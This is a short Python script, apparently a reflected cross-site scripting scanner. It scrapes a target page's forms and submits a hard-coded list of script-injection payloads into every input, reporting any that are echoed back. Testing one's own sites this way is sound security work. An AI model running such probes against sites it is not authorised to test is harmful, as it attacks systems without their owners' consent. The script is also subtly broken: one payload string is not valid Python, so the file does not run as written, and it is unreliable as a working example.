import requests
import sys
from bs4 import BeautifulSoup

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "'"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)"
]

def scan_xss(url):
    print(f"[*] Auditing web endpoints on target: {url}")
    
    try:
        r = requests.get(url, timeout=5)
    except Exception as e:
        print(f"[-] Error connecting to target: {e}")
        return

    soup = BeautifulSoup(r.text, 'html.parser')
    forms = soup.find_all('form')
    print(f"[+] Discovered {len(forms)} form inputs on main interface.")

    for i, form in enumerate(forms):
        action = form.get('action')
        method = form.get('method', 'get').lower()
        form_url = url if not action else url + action
        
        inputs = form.find_all('input')
        for payload in XSS_PAYLOADS:
            data = {}
            for inp in inputs:
                name = inp.get('name')
                if name:
                    data[name] = payload
            
            if method == 'post':
                res = requests.post(form_url, data=data, timeout=5)
            else:
                res = requests.get(form_url, params=data, timeout=5)
                
            if payload in res.text:
                print(f"[!] DANGER: XSS vulnerability found in form #{i} at {form_url}")
                print(f"    Payload triggered: {payload}")
                return
                
    print("[+] Security scan complete. No basic reflected forms triggered.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python xss_scanner.py <url>")
        sys.exit(1)
    scan_xss(sys.argv[1])